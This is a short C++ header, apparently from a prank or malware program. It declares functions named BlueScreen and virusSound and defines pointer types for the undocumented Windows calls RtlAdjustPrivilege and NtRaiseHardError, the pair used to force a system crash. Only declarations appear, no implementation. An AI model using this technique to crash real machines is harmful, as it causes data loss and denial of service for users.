#pragma once
#include <Windows.h>
void BlueScreen();
DWORD WINAPI virusSound(LPVOID lpParam);
//DWORD WINAPI virusMessageBox(LPVOID lpParam);
typedef NTSTATUS(NTAPI* RtlAdjustPrivilegePtr)(ULONG, BOOL, BOOL, PBOOLEAN);
typedef NTSTATUS(NTAPI* NtRaiseHardErrorPtr)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);